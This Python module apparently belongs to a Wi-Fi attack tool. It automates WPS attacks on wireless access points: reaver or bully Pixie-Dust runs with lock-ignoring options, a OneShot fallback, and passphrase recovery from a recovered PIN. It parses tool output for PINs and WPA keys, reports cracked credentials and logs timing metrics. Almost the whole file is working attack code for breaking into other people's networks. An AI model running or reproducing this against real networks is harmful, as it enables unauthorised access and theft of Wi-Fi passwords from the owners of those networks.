# -*- coding: utf-8 -*-
"""WPS method bake-off: reaver pixie → OneShot → vendor PINs → GETPSK.

Online 10M PIN brute-force is never used. Structured logs for tuning:
  grep -aE 'wps-method|wps-ap|wps-metric|run-metric' ~/C/wifibox.log
"""
import os
import re
import select
import shutil
import subprocess
import time

import config
from attack import interface as iface_mod
from attack import oneshot_wps
from attack import tools
from attack import wps_log
from attack.model import AttackEvent, EventType


PIN_RE = re.compile(
    r"(?:WPS PIN|PIN FOUND|Pin is|setting pin to)\s*:?\s*'?([0-9]{4,8})'?",
    re.I)
PSK_RE = re.compile(
    r"(?:WPA PSK|key is)\s*:?\s*'([^']*)'|(?:WPA PSK)\s*:\s*(\S+)",
    re.I)
PIXIE_FAIL_RE = re.compile(
    r"pin not found|WPS pin not found|pixie-?dust.*fail|Pixiewps fail|"
    r"Pixiewps timeout|Pixiewps fail, sending|"
    r"trying -f \(full PRNG|full PRNG brute force|"
    r"failed to recover WPA key",
    re.I)
PIN_BF_RE = re.compile(
    r"%\s*complete\s*@"
    r"|Nothing done, nothing to save"
    r"|Max pin attempts"
    r"|Starting Cracking Session"
    r"|Pin count:",
    re.I)
TRYING_PIN_RE = re.compile(r"Trying pin\s+[\"']?\d{4,8}", re.I)
WPS_OFF_RE = re.compile(r"AP seems to have WPS turned off", re.I)
RECOVER_FAIL_RE = re.compile(r"failed to recover WPA key", re.I)
HARD_LOCK_RE = re.compile(
    r"WPS lock(?:out)?|AP (?:is )?locked|WARNING.*(?:WPS )?lock",
    re.I)
BEACON_RE = re.compile(r"Received beacon from", re.I)
ASSOC_RE = re.compile(r"Associated with", re.I)
M1_RE = re.compile(r"Received M1\b", re.I)
M3_RE = re.compile(r"Received M3\b", re.I)
PIXIE_RUN_RE = re.compile(
    r"Starting Pixie|Pixiewps:|Pixie-Dust|Running pixiewps", re.I)
EXCHANGE_RE = re.compile(
    r"Associated with|Received M[1-7]|Starting Pixie|Pixiewps:|"
    r"Sending EAPOL|EAPOL start",
    re.I)
PKE_RE = re.compile(r"(?:PKE|Enrollee\s+Public\s+Key)[:\s]+([0-9A-Fa-f]{32,})", re.I)

GETPSK_TIMEOUT = 120
GETPSK_FIRST = 45
GETPSK_COOL_SEC = 8
PIN_HOLD_SEC = 12
BEACON_SOFT_SEC = 15
ASSOC_SOFT_SEC = 35
NO_M3_SOFT_SEC = 18  # M1 seen but no M3 — don't burn full pixie timeout

_STDBUF = shutil.which("stdbuf") or (
    "/usr/bin/stdbuf" if os.path.exists("/usr/bin/stdbuf") else None)
_last_pke = {}


def _psk_from_line(line):
    m = PSK_RE.search(line)
    if not m:
        return None
    return m.group(1) if m.group(1) is not None else m.group(2)


def _session_paths(bssid):
    raw = (bssid or "").replace(":", "").replace("-", "")
    names = [raw.upper(), raw.lower()]
    paths = []
    for base in ("/var/lib/reaver", "/etc/reaver"):
        for name in names:
            if name:
                paths.append(os.path.join(base, "%s.wpc" % name))
    return paths


def _clear_session(bssid):
    for path in _session_paths(bssid):
        try:
            os.remove(path)
            tools.log("wps: cleared session %s" % path)
        except OSError:
            pass


def _stop_proc(proc):
    if not proc:
        return
    try:
        if proc.stdin:
            try:
                proc.stdin.close()
            except Exception:  # noqa: BLE001
                pass
        proc.terminate()
        proc.wait(timeout=3)
    except Exception:  # noqa: BLE001
        try:
            proc.kill()
        except Exception:  # noqa: BLE001
            pass


def _spawn(cmd, clear_bssid=None):
    if clear_bssid:
        _clear_session(clear_bssid)
    real = list(cmd)
    if _STDBUF and real and "bully" not in os.path.basename(real[0]):
        real = [_STDBUF, "-oL", "-eL"] + real
    tools.log("wps spawn: %s" % " ".join(real))
    proc = subprocess.Popen(
        real, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT, bufsize=1, text=True)
    try:
        if proc.stdin:
            proc.stdin.write("n\n")
            proc.stdin.flush()
    except Exception:  # noqa: BLE001
        pass
    return proc


def _drain_psk(proc):
    if not proc or not proc.stdout:
        return None
    try:
        ready, _, _ = select.select([proc.stdout.fileno()], [], [], 0.3)
        if not ready:
            return None
        rest = proc.stdout.read() or ""
    except Exception:  # noqa: BLE001
        return None
    psk = None
    for line in rest.splitlines():
        tools.log("wps drain: %s" % line.strip())
        got = _psk_from_line(line)
        if got is not None:
            psk = got
    return psk


def _build_cmd(tool, mon, target, ignore_locks):
    bssid = target["bssid"]
    channel = str(target.get("channel") or "")
    if tool == "bully":
        cmd = [tools.BULLY, "-b", bssid, "-d", "-v", "3"]
        if channel:
            cmd += ["-c", channel]
        if ignore_locks:
            cmd.append("-L")
        cmd.append(mon)
        return cmd
    cmd = [tools.REAVER, "-i", mon, "-b", bssid, "-K", "-N", "-vv"]
    if channel:
        cmd += ["-c", channel]
    if ignore_locks:
        cmd.append("-L")
    return cmd


def _note_pke(bssid, line):
    m = PKE_RE.search(line)
    if not m:
        return 0
    pke = m.group(1).upper()
    key = config._norm_bssid(bssid) or bssid
    prev = _last_pke.get(key)
    _last_pke[key] = pke
    if prev and prev == pke:
        return 1
    return 0


def _managed_name(mon, iface_name):
    """Best-effort managed iface after leaving monitor — must stay on EXTERNAL."""
    want = iface_name or (str(mon)[:-3] if str(mon).endswith("mon") else mon)
    want = str(want or "").strip()
    ifaces = iface_mod.get_interfaces()
    names = [n for n, _ in ifaces]
    # Exact match first
    if want in names and not iface_mod.is_in_monitor(want):
        return want
    # airmon rename: wlan1mon → wlan1
    if want.endswith("mon"):
        base = want[:-3]
        if base in names and not iface_mod.is_in_monitor(base):
            return base
    if mon and str(mon).endswith("mon"):
        base = str(mon)[:-3]
        if base in names and not iface_mod.is_in_monitor(base):
            return base
    # Prefer any non-internal USB wireless (never fall back to brcmfmac/wlan0)
    for n, drv in ifaces:
        if drv == config.INTERNAL_DRIVER:
            continue
        if not iface_mod.is_in_monitor(n):
            return n
    return want or mon


def _to_managed(mon, iface_name):
    iface_mod.disable_monitor(mon)
    time.sleep(0.4)
    name = _managed_name(mon, iface_name)
    # ensure managed + up
    iface_mod.run(["ip", "link", "set", name, "up"])
    tools.log("wps: managed for oneshot -> %s (was mon=%s iface=%s)" % (
        name, mon, iface_name))
    return name


def _to_monitor(iface_name):
    mon = iface_mod.enable_monitor(iface_name)
    if mon:
        config.Runtime.monitor_iface = mon
    return mon


def _reaver_pixie(mon, target, req, emit, stop_flag):
    """Single reaver/bully pixie attempt. Returns dict with pin/psk/reason/timings."""
    bssid = target["bssid"]
    essid = target.get("essid") or bssid
    channel = target.get("channel")
    signal = target.get("signal")
    tool = config.opt_state(req.attack_modes, "WPS Tool", "reaver")
    ignore_locks = config.opt_bool(req.attack_modes, "Ignore Locks", False)
    timeout = config.opt_int(req.timing, "WPS Timeout", 180)
    beacon_soft = min(BEACON_SOFT_SEC, max(3, timeout // 3))
    assoc_soft = min(ASSOC_SOFT_SEC, max(beacon_soft + 5, timeout - 5))

    out = {
        "ok": False, "pin": None, "psk": None, "reason": "no pin",
        "tool": tool, "static_pke": 0,
        "t_beacon": None, "t_assoc": None, "t_m1": None, "t_m3": None,
        "t_pixie": None, "t_pin": None, "t": 0.0, "soft": False,
    }
    bin_path = tools.BULLY if tool == "bully" else tools.REAVER
    if not tools.tool_ok(bin_path):
        out["reason"] = "missing"
        emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                         detail="%s missing" % tool))
        return out

    iface_mod.lock_channel(mon, channel)
    cmd = _build_cmd(tool, mon, target, ignore_locks)
    tools.log("wps pixie-only: timeout=%ss beacon=%ss assoc=%ss ch=%s" % (
        timeout, beacon_soft, assoc_soft, channel))
    try:
        proc = _spawn(cmd, clear_bssid=bssid)
    except Exception as e:  # noqa: BLE001
        out["reason"] = str(e)[:20]
        emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                         detail=out["reason"]))
        return out

    start = time.time()
    pin = psk = None
    fail_reason = None
    saw_beacon = saw_exchange = saw_pixie_run = False
    t_beacon = t_assoc = t_m1 = t_m3 = t_pixie = t_pin = None
    static_pke = 0
    fd = proc.stdout.fileno()
    hold_deadline = None

    def elapsed():
        return time.time() - start

    try:
        while True:
            if stop_flag and stop_flag.is_set():
                fail_reason = "cancelled"
                out["cancelled"] = True
                break
            now = elapsed()
            if hold_deadline is not None:
                if psk is not None or now >= hold_deadline:
                    break
            elif now > timeout:
                fail_reason = "timeout"
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="timeout"))
                break

            if hold_deadline is None:
                if not saw_beacon and now > beacon_soft:
                    fail_reason = "no beacon"
                    out["soft"] = True
                    tools.log("wps SOFT: no beacon %ss %s" % (beacon_soft, bssid))
                    emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                     detail="no beacon"))
                    break
                if saw_beacon and not saw_exchange and now > assoc_soft:
                    fail_reason = "no assoc"
                    out["soft"] = True
                    tools.log("wps SOFT: no assoc %ss %s" % (assoc_soft, bssid))
                    emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                     detail="no assoc"))
                    break
                # Got M1 but never M3/pixie — AP isn't handing pixie material.
                if (t_m1 is not None and t_m3 is None and t_pixie is None
                        and (now - t_m1) > NO_M3_SOFT_SEC):
                    fail_reason = "no m3"
                    tools.log("wps SOFT: no M3 %.0fs after M1 %s" % (
                        now - t_m1, bssid))
                    emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                     detail="no m3"))
                    break

            if not saw_beacon:
                phase, left, mx = ("BEACON",
                                   max(0, int(beacon_soft - now)), beacon_soft)
            elif not saw_exchange:
                phase, left, mx = ("ASSOC",
                                   max(0, int(assoc_soft - now)), assoc_soft)
            elif hold_deadline is not None:
                phase, left, mx = ("PIXIE",
                                   max(0, int(hold_deadline - now)),
                                   PIN_HOLD_SEC)
            else:
                phase, left, mx = ("PIXIE",
                                   max(0, int(timeout - now)), timeout)

            ready, _, _ = select.select([fd], [], [], 0.5)
            if not ready:
                emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
                                 phase=phase, countdown=left, cd_max=mx,
                                 signal=signal))
                continue
            line = proc.stdout.readline()
            if not line:
                break
            line = line.strip()
            if not line:
                continue
            tools.log("wps pixie: %s" % line)
            if _note_pke(bssid, line):
                static_pke = 1

            if BEACON_RE.search(line):
                if not saw_beacon:
                    t_beacon = elapsed()
                saw_beacon = True
            if ASSOC_RE.search(line) and t_assoc is None:
                t_assoc = elapsed()
            if M1_RE.search(line) and t_m1 is None:
                t_m1 = elapsed()
            if M3_RE.search(line) and t_m3 is None:
                t_m3 = elapsed()
            if PIXIE_RUN_RE.search(line):
                saw_pixie_run = True
                if t_pixie is None:
                    t_pixie = elapsed()
            if EXCHANGE_RE.search(line):
                saw_beacon = True
                saw_exchange = True

            if WPS_OFF_RE.search(line):
                fail_reason = "wps off"
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="wps off"))
                break
            if hold_deadline is None and PIXIE_FAIL_RE.search(line):
                fail_reason = "pixie fail"
                tools.log("wps: pixie fail — skip online BF %s" % bssid)
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="no pin"))
                break
            if hold_deadline is None and (PIN_BF_RE.search(line) or (
                    saw_pixie_run and TRYING_PIN_RE.search(line) and not pin)):
                fail_reason = "pin bf"
                tools.log("wps: block online PIN BF %s" % bssid)
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="pin bf"))
                break

            got = _psk_from_line(line)
            if got is not None:
                psk = got
                saw_exchange = True
                if pin:
                    break
                # rare: PSK without PIN line
                break
            m = PIN_RE.search(line)
            if m and hold_deadline is None:
                pin = m.group(1)
                t_pin = elapsed()
                saw_exchange = True
                tools.log("wps: PIXIE PIN %s %s — hold %ss for PSK" % (
                    pin, bssid, PIN_HOLD_SEC))
                hold_deadline = elapsed() + PIN_HOLD_SEC
                continue
            if HARD_LOCK_RE.search(line) and not ignore_locks:
                fail_reason = "wps lock"
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="wps lock"))
                break
            emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
                             phase=phase, countdown=left, cd_max=mx,
                             signal=signal))
    finally:
        _stop_proc(proc)

    out.update({
        "pin": pin, "psk": psk, "static_pke": static_pke,
        "t_beacon": t_beacon, "t_assoc": t_assoc, "t_m1": t_m1, "t_m3": t_m3,
        "t_pixie": t_pixie, "t_pin": t_pin, "t": elapsed(),
        "reason": ("ok" if (pin or psk) else (fail_reason or "no pin")),
        "ok": bool(pin or psk),
    })
    return out


def _do_getpsk(mon, target, pin, emit, stop_flag, tool, timeout, run_id,
               method_name="getpsk"):
    essid = target.get("essid") or target.get("bssid")
    bssid = target.get("bssid")
    t0 = time.time()
    emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
                     phase="GETPSK", countdown=timeout, cd_max=timeout,
                     signal=target.get("signal")))
    psk = _recover_psk(mon, target, pin, emit, essid, bssid, stop_flag,
                       tool=tool, ignore_locks=True, timeout=timeout)
    t = time.time() - t0
    wps_log.method({
        "run_id": run_id, "bssid": bssid, "essid": essid,
        "ch": target.get("channel"), "sig": target.get("signal"),
        "method": method_name, "result": "psk" if psk else "fail",
        "reason": "ok" if psk else "no psk", "pin": pin, "t": t,
        "won": 1 if psk else 0, "upgraded": 1 if psk else 0,
    })
    return psk


def pixie(mon, target, req, emit, stop_flag, run_id=None, iface_name=None):
    """Multi-method WPS. Returns ok/psk/pin + mon (may change after OneShot)."""
    run_id = run_id or wps_log.new_run_id()
    bssid = target["bssid"]
    essid = target.get("essid") or bssid
    channel = target.get("channel")
    signal = target.get("signal")
    tool = config.opt_state(req.attack_modes, "WPS Tool", "reaver")
    timeout = config.opt_int(req.timing, "WPS Timeout", 180)
    methods_tried = []
    winner = None
    pin_from = None
    psk_from = None
    pin = None
    psk = None
    cancelled = False
    t_all = time.time()

    # --- 1) reaver/bully pixie ---
    methods_tried.append("reaver_pixie")
    r = _reaver_pixie(mon, target, req, emit, stop_flag)
    if r.get("cancelled"):
        cancelled = True
    wps_log.method({
        "run_id": run_id, "bssid": bssid, "essid": essid, "ch": channel,
        "sig": signal, "method": "reaver_pixie", "attempt": 1,
        "result": ("psk" if r.get("psk") else ("pin" if r.get("pin") else "fail")),
        "reason": r.get("reason"), "pin": r.get("pin"), "t": r.get("t"),
        "t_beacon": r.get("t_beacon"), "t_assoc": r.get("t_assoc"),
        "t_m1": r.get("t_m1"), "t_m3": r.get("t_m3"),
        "t_pixie": r.get("t_pixie"), "t_pin": r.get("t_pin"),
        "static_pke": r.get("static_pke") or 0,
        "won": 1 if r.get("ok") else 0,
    })
    if r.get("ok"):
        winner = "reaver_pixie"
        pin = r.get("pin")
        psk = r.get("psk")
        pin_from = "reaver_pixie" if pin else None
        if psk:
            psk_from = "reaver_pixie"

    # OneShot runs in managed mode (wpa_supplicant) — a different radio path
    # than reaver's monitor-mode beacon/assoc detection. If reaver never saw
    # the AP's beacon ("no beacon") the target isn't reachable at all, so skip
    # OneShot as well. Same for "no assoc" — the AP refused association.
    skip_oneshot = r.get("reason") in ("no assoc", "no beacon")
    # --- 2) OneShot pixie ---
    if (not pin and not psk and not cancelled and not skip_oneshot
            and not (stop_flag and stop_flag.is_set())):
        methods_tried.append("oneshot_pixie")
        managed = None
        oshot_t = min(oneshot_wps.ONESHOT_MAX_SEC, timeout)
        try:
            managed = _to_managed(mon, iface_name or mon)
            o = oneshot_wps.run_pixie(managed, target, emit, stop_flag,
                                      timeout=oshot_t)
        except Exception as e:  # noqa: BLE001
            o = {"ok": False, "reason": str(e)[:20], "t": 0.0}
        finally:
            new_mon = _to_monitor(iface_name or managed or mon)
            if new_mon:
                mon = new_mon
        wps_log.method({
            "run_id": run_id, "bssid": bssid, "essid": essid, "ch": channel,
            "sig": signal, "method": "oneshot_pixie", "attempt": 1,
            "result": ("psk" if o.get("psk") else (
                "pin" if o.get("pin") is not None and o.get("ok") else "fail")),
            "reason": o.get("reason"), "pin": o.get("pin"), "t": o.get("t"),
            "won": 1 if o.get("ok") else 0,
        })
        if o.get("ok"):
            winner = "oneshot_pixie"
            pin = o.get("pin") if o.get("pin") is not None else pin
            psk = o.get("psk") or psk
            pin_from = "oneshot_pixie"
            if psk:
                psk_from = "oneshot_pixie"

    # --- GETPSK if we have PIN but no PSK ---
    if (pin is not None and psk is None and not cancelled
            and not (stop_flag and stop_flag.is_set())):
        time.sleep(GETPSK_COOL_SEC)
        psk = _do_getpsk(mon, target, pin, emit, stop_flag, tool,
                         GETPSK_FIRST, run_id, method_name="getpsk")
        if psk:
            psk_from = "getpsk"

    result = {"ok": False, "essid": essid, "bssid": bssid, "mon": mon,
              "run_id": run_id}
    if cancelled:
        result["cancelled"] = True

    if psk is not None or pin is not None:
        emit(AttackEvent(EventType.CRACKED, essid=essid, bssid=bssid,
                         credential=psk, pin=pin))
        result.update({"ok": True, "psk": psk, "pin": pin,
                       "winner": winner, "psk_from": psk_from,
                       "pin_from": pin_from})
        outcome = "psk" if psk else "pin"
    else:
        outcome = "fail"
        result.update({"winner": None, "psk_from": None, "pin_from": None})

    wps_log.ap({
        "run_id": run_id, "bssid": bssid, "essid": essid, "sig": signal,
        "ch": channel, "winner": winner or "none",
        "pin_from": pin_from or "none", "psk_from": psk_from or "none",
        "methods_tried": ",".join(methods_tried),
        "t_total": time.time() - t_all, "result": outcome,
    })
    wps_log.metric({
        "run_id": run_id, "bssid": bssid, "essid": essid, "ch": channel,
        "sig": signal, "tool": tool, "result": outcome,
        "winner": winner or "none", "pin": pin,
        "t_total": time.time() - t_all,
    })
    return result


def recover_psk(iface, target, pin, emit, stop_flag=None, timeout=GETPSK_TIMEOUT):
    essid = target.get("essid") or target.get("bssid")
    bssid = target.get("bssid")
    recovered = iface_mod.ensure_external(recover=True)
    if recovered:
        iface = recovered
    name = iface_mod.iface_name(iface)
    tool = "bully" if (not tools.tool_ok(tools.REAVER)
                       and tools.tool_ok(tools.BULLY)) else "reaver"
    bin_path = tools.BULLY if tool == "bully" else tools.REAVER
    if not tools.tool_ok(bin_path):
        emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                         detail="%s missing" % tool))
        return None
    try:
        with iface_mod.monitor_mode(name) as mon:
            return recover_psk_on(mon, target, pin, emit, stop_flag,
                                  tool=tool, timeout=timeout)
    except RuntimeError as e:
        emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                         detail=str(e)[:20]))
        return None


def recover_psk_on(mon, target, pin, emit, stop_flag=None, tool="reaver",
                   timeout=GETPSK_TIMEOUT):
    essid = target.get("essid") or target.get("bssid")
    bssid = target.get("bssid")
    return _recover_psk(mon, target, pin, emit, essid, bssid, stop_flag,
                        timeout=timeout, tool=tool, ignore_locks=True)


def _recover_psk(mon, target, pin, emit, essid, bssid, stop_flag,
                 timeout=GETPSK_TIMEOUT, tool="reaver", ignore_locks=False):
    """Known-PIN → PSK only (not online BF). Uses reaver -p / bully -p."""
    bin_path = tools.BULLY if tool == "bully" else tools.REAVER
    if not tools.tool_ok(bin_path):
        emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                         detail="%s missing" % tool))
        return None
    iface_mod.lock_channel(mon, target.get("channel"))
    if tool == "bully":
        # known PIN — do NOT pass -d (pixie)
        cmd = [tools.BULLY, "-b", bssid, "-p", str(pin), "-v", "3"]
        if target.get("channel"):
            cmd += ["-c", str(target["channel"])]
        if ignore_locks:
            cmd.append("-L")
        cmd.append(mon)
    else:
        cmd = [tools.REAVER, "-i", mon, "-b", bssid, "-p", str(pin), "-vv"]
        if target.get("channel"):
            cmd += ["-c", str(target["channel"])]
        if ignore_locks:
            cmd.append("-L")
    try:
        proc = _spawn(cmd, clear_bssid=bssid)
    except Exception:  # noqa: BLE001
        return None
    start = time.time()
    psk = None
    fail_detail = None
    deauths = 0
    fd = proc.stdout.fileno()
    try:
        while (time.time() - start) < timeout:
            if stop_flag and stop_flag.is_set():
                break
            ready, _, _ = select.select([fd], [], [], 0.5)
            if not ready:
                emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
                                 phase="GETPSK",
                                 countdown=max(0, int(
                                     timeout - (time.time() - start))),
                                 cd_max=timeout))
                continue
            line = proc.stdout.readline()
            if not line:
                break
            line = line.strip()
            if not line:
                continue
            tools.log("wps psk-recover: %s" % line)
            got = _psk_from_line(line)
            if got is not None:
                psk = got
                break
            if re.search(r"Received deauth", line, re.I):
                deauths += 1
                if deauths >= 2:
                    fail_detail = "deauth"
                    break
            if re.search(r"rate limiting", line, re.I):
                continue
            if HARD_LOCK_RE.search(line) and not ignore_locks:
                fail_detail = "wps lock"
                break
            if RECOVER_FAIL_RE.search(line):
                fail_detail = "no psk"
                break
        else:
            fail_detail = fail_detail or "timeout"
    finally:
        _stop_proc(proc)
        if psk is None:
            drained = _drain_psk(proc)
            if drained is not None:
                psk = drained
    if psk is None and fail_detail and not (stop_flag and stop_flag.is_set()):
        emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                         detail=fail_detail))
    return psk
